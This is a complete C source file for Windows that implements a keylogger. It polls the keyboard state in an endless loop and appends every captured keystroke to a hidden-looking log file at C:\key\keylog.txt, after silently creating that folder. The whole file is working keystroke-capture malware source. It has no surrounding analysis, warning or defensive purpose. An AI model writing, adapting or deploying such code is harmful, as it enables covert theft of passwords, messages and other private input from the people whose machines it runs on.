#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define LOG_FILE "C:\\key\\keylog.txt"

void write_key(char key) {
    FILE *file = fopen(LOG_FILE, "a");
    if (file != NULL) {
        fprintf(file, "%c", key);
        fclose(file);
    }
}

int main() {
    // Create directory if not exists
    system("mkdir C:\\key 2>nul");

    while (1) {
        Sleep(100); // Prevent high CPU usage
        for (int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                char key = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
                if (key) write_key(key);
            }
        }
    }

    return 0;
}